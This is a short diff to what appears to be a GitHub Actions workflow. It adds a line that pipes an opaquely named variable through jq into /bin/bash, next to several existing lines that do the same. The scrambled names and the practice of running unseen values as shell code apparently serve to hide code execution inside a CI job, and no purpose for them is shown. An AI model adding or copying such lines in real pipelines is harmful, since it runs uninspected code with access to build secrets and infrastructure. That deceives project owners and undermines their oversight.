@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$jve26132" | jq -r .sjide1 | /bin/bash
           printf '%s' "$xim443" | jq -r .rf3 | /bin/bash
           printf '%s' "$jva96225" | jq -r .ck1 | /bin/bash
+          echo $s23 | jq -r .tj298 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
